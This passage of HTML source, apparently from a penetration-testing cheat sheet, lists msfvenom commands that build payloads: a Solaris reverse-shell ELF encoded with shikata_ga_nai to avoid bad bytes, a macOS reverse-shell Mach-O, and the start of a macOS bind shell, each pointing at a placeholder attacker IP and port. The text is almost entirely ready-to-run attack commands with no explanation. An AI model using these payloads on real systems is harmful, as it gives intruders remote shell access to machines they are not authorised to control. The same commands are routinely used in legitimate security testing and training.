ight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>--platform<span class=\"o\">=</span>solaris<span class=\"w\"> </span>--payload<span class=\"o\">=</span>solaris/x86/shell_reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=(</span>ATTACKER<span class=\"w\"> </span>IP<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=(</span>ATTACKER<span class=\"w\"> </span>PORT<span class=\"o\">)</span><span class=\"w\"> </span>-f<span class=\"w\"> </span>elf<span class=\"w\"> </span>-e<span class=\"w\"> </span>x86/shikata_ga_nai<span class=\"w\"> </span>-b<span class=\"w\"> </span><span class=\"s1\">&#39;\\x00&#39;</span><span class=\"w\"> </span>&gt;<span class=\"w\"> </span>solshell.elf\n</code></pre></div>\n<h2 id=\"mac-payloads\"><strong>MAC Payloads</strong></h2>\n<h3 id=\"reverse-shell_2\"><strong>Reverse Shell:</strong></h3>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>osx/x86/shell_reverse_tcp<span class=\"w\"> </span><span class=\"nv\">LHOST</span><span class=\"o\">=(</span>IP<span class=\"w\"> </span>Address<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=(</span>Your<span class=\"w\"> </span>Port<span class=\"o\">)</span><span class=\"w\"> </span>-f<span class=\"w\"> </span>macho<span class=\"w\"> </span>&gt;<span class=\"w\"> </span>reverse.macho\n</code></pre></div>\n<h3 id=\"bind-shell_2\"><strong>Bind Shell</strong></h3>\n<div class=\"highlight\"><pre><span></span><code>msfvenom<span class=\"w\"> </span>-p<span class=\"w\"> </span>osx/x86/shell_bind_tcp<span class=\"w\"> </span><span class=\"nv\">RHOST</span><span class=\"o\">=(</span>IP<span class=\"w\"> </span>Address<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"nv\">LPORT</span><span class=\"o\">=(</span>Your<span class=\"w\"> </span>Port<span class=\"o\">)</span><span class=